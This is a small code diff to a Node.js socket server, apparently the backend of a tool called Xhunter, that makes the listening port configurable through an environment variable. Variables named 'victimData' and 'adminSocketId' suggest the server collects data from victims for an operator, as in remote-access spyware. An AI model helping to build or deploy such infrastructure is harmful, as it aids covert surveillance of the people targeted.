@@ -12,7 +12,7 @@ var victimData={};
 var adminSocketId=null;
 const port = 8080;
 
-server.listen(port, (err) => {  if (err) return;log("Server Started : " + port);});
+server.listen(process.env.PORT || port, (err) => {  if (err) return;log("Server Started : " + port);});
 app.get('/', (req, res) => res.send('Welcome to Xhunter Backend Server!!'))
 
 io.on('connection', (socket) => {
